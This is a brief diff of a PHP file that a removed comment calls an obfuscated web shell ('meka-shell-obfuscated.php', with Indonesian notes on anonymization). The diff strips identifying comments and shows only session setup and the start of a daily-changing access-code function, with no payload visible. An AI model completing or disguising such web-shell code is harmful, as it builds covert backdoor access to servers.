@@ -1,12 +1,9 @@
 <?php
-// meka-shell-obfuscated.php - VERSI FINAL DENGAN ANONYMIZASI
 session_start();
 
-// === ENHANCED SECURITY CONFIGURATION ===
 $SALT_SEED = "m3k4";
 $SESSION_TIMEOUT = 3600;
 
-// === DYNAMIC ACCESS CODE ===
 function getAccessCode() {
     global $SALT_SEED;
     $date_salt = date('Y-m-d'); // Berubah setiap hari
